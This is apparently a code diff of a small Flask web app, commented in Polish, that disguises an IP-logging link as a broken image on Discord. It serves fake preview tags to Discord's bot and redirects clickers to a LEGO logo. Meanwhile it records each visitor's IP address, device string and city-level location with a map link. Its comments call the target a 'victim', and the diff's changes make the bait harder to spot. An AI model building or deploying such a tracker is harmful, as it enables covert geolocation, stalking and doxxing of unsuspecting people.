@@ -4,44 +4,45 @@ import requests
 app = Flask(__name__)
 
 # --- KONFIGURACJA ---
-# PODMIENIONE ZDJĘCIE (Inny błąd wczytywania)
-ERROR_IMG = "https://www.pngall.com/wp-content/uploads/8/Warning-PNG-Free-Download.png"
-# Zdjęcie docelowe (LEGO)
+# Link do Twojego wybranego zdjęcia błędu
+ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
+# Zdjęcie, które widzi ofiara po kliknięciu
 REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"
 
-# HTML dla Discorda
+# HTML z "czystymi" Meta Tagami
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:title" content="Image Preview">
-    <meta property="og:type" content="website">
+    <meta property="og:site_name" content=" ">
+    <meta property="og:title" content=" ">
     <meta property="og:image" content="{ERROR_IMG}">
+    <meta property="og:image:type" content="image/png">
     <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="{ERROR_IMG}">
     <meta http-equiv="refresh" content="0; url={REAL_IMG}">
 </head>
-<body>Przekierowanie...</body>
+<body style="background-color: #36393f;"></body>
 </html>
 '''
 
 @app.route('/image.png')
 def logger():
     ua = request.headers.get('User-Agent', '')
-    # Wyciąganie IP przez proxy Rendera
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
+    # Jeśli to bot Discorda - wysyłamy meta tagi obrazka
     if "Discordbot" in ua or "externalhit" in ua.lower():
-        print(f"--- BOT DC SPRAWDZA ---")
         return render_template_string(HTML_TEMPLATE)
 
-    # LOGOWANIE DANYCH
-    print(f"\n[!!!] Ktoś wszedł w link [!!!]")
+    # LOGOWANIE DANYCH DO KONSOLI RENDERA
+    print(f"\n[!!!] OFIARA NAMIERZONA [!!!]")
     print(f"IP: {ip}")
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
         if r.get("status") == "success":
             print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
-            print(f"MAPA: http://google.com/maps?q={r.get('lat')},{r.get('lon')}")
+            print(f"MAPA: http://www.google.com/maps/place/{r.get('lat')},{r.get('lon')}")
     except: pass
     print(f"DEVICE: {ua}\n")
 
